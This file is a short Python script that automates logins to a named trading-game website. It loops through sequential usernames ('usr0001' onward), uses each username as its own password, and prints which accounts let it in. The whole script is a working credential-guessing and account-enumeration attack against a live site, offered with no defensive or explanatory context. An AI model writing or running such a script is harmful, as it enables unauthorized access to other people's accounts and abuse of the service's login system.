import re
from robobrowser import RoboBrowser
import time
import urllib
import datetime
import hashlib
import re
import socket
import random


# ----- Start crawling 
crid = 1

while(True):
    
    username = "usr%.4d" % crid
    # print username;

    browser = RoboBrowser()
    browser.open('https://click2win.settrade.com/LoginRepOnRole.jsp?txtLogin='+username+'&txtPassword='+username+'&txtSecureKey=NONE&txtDefaultPage=%2FSETClick2WIN%2FSelectUserLeague.jsp&txtLoginPage=SETClick2WIN/index.jsp&txtBrokerId=089&txtSystem=ITP&txtRole=INTERNET&tmpUsername=&tmpPassword=')
    form = browser.get_forms()[0]
    browser.submit_form(form)
    form = browser.get_forms()[0]
    browser.submit_form(form)
    body = str(browser.parsed)
    # print type(body)
    # print body

    if ( "openStreaming" in body):
        print "OK -- " + username;
    else:
        print "FA ------------ " + username;
        

    crid+=1;
    # break;